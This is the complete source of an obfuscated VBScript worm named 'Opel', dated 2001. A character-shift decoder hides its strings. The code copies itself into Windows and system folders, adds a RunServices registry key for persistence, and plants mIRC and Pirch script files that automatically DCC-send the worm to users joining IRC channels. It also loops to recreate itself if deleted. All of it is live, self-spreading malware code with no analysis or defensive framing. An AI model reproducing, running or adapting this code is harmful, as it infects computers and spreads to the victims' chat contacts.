REM Opel
REM By The WarluS 10/2001
On Error Resume Next
Dim Fso, Reg, WinFol, SysFol
Set Fso = CreateObject(s("Rbshquhof/GhmdRxrudlNckdbu"))
Set WinFol=Fso.GetSpecialFolder(0)
Set SysFol=Fso.GetSpecialFolder(1)
Set C = Fso.GetFile(WScript.ScriptFullName)
Set Reg = CreateObject(s("VRbshqu/Ridmm"))
Installed = Reg.RegRead(s("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]StoRdswhbdr]Nqdm"))
If Installed = "" Then 
Randomize
CXD = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999) & s("/wcd")
C.Copy(SysFol & s("]") & CXD)
Reg.RegWrite s("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]StoRdswhbdr]Nqdm"), SysFol & s("]") & CXD
End If
If Not (Fso.FileExists(WinFol & s("]Nqdm/wcr"))) Then C.Copy(WinFol & s("]Nqdm/wcr"))
Set Drives = fso.Drives
For Each Drive In Drives
If Drive.isready Then 
Dosearch Drive
End If 
Next 
Function Dosearch(Path) 
On Error Resume Next
Set Folder=fso.GetFolder(Path) 
Set Files = Folder.Files 
For Each File in files
If File.Name = s("lhsb/hoh") Then
MircPath = File.ParentFolder 
Call MircSpreader(MircPath)
End If 
If File.Name = s("qhsbi89/hoh") Then
PirchPath = File.ParentFolder 
Call PirchSpreader(PirchPath)
End If 
Next 
Set Subfolders = Folder.SubFolders 
For Each Subfolder In Subfolders 
Dosearch Subfolder.Path 
Next 
End Function 
Sub MircSpreader(MircPath)
Set ini = Fso.CreateTextFile(MircPath & s("]rbshqu/hoh"))
ini.writeline s("Zrbshqu\")
ini.writeline s(":!Nqdm!Cx!Uid!V`mstR!01.3110")
ini.writeline s("o1<no!0;Q@SU;#;!hg!)!%ld! <!%ohbj!(!z!.ebb!rdoe!%ohbj!") & WinFol & s("]Nqdm/wcr!|")
ini.Close
End Sub
Sub PirchSpreader(PirchPath)
Set ini = Fso.CreateTextFile(PirchPath & s("]dwdour/hoh"))
ini.writeline s("Zrbshqu\")
ini.writeline s(":!Nqdm!Cx!Uid!V`mstR!01.3110")
ini.writeline s("ZMdwdmr\")
ini.writeline s("Do`cmde<0")
ini.writeline s("Bntou<0")
ini.writeline s("Mdwdm0<111,Tojonvor")
ini.writeline s("111,TojonvorDo`cmde<0")
ini.writeline ""
ini.writeline s("Z111,Tojonvor\")
ini.writeline s("Trds0<+ +A+")
ini.writeline s("TrdsBntou<0")
ini.writeline s("Dwdou0<NO!Q@SU;#;.ebb!rdoe!%ohbj!") & WinFol & s("]Nqdm/wcr")
ini.writeline s("DwdouBntou<0")
ini.Close
End Sub
FSO.DeleteFile(s("B;]rbshqu/hoh"))
FSO.DeleteFile(s("B;]dwdour/hoh"))
If Right(WScript.ScriptFullName,3) = s("wcd") Then
Set Myself = Fso.OpenTextFile(WScript.ScriptFullName, 1)
MyCode = Myself.ReadAll
Myself.Close
Do
If Not (Fso.FileExists(WScript.ScriptFullName)) Then
Set Myself = Fso.CreateTextfile(Wscript.ScriptFullName, True)
Myself.write MyCode
Myself.Close
Reg.RegWrite s("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]StoRdswhbdr]Nqdm"), SysFol & s("]") & Wscript.ScriptFullName
End If
Loop
End If
'Justanotherlamevbsworm
Function s(HTSQCLV)
UxThSwNn = EiRg6636 & BxHj11054
For BDUMCAM = 1 To Len(HTSQCLV)
FNDKVLF = Mid(HTSQCLV, BDUMCAM, 1)
KeCn7906 = RjGzNhNq & OvEg12222 & Int(Rnd * 4615)
If Asc(FNDKVLF) <> 34 And Asc(FNDKVLF) <> 35 Then
If Asc(FNDKVLF) Mod 2 = 0 Then
SxNx9834 = BjHjDkTy & QkMw9753 & Int(Rnd * 2050)
FNDKVLF = Chr(Asc(FNDKVLF) + 1)
Else
NoOx3863 = EjFxDsLr & KxVg14119 & QlNvCsGs & HwOz12177
FNDKVLF = Chr(Asc(FNDKVLF) - 1)
RjOeNwEu = JkOf12154 & GiRi15159
End If
EwPv3552 = NsKsFjOh & SjJw7677 & Int(Rnd * 4705)
End If
s = s & FNDKVLF
Next
GeJu17616 = UuKiGoRs & JgLv11346 & Int(Rnd * 9496)
End Function


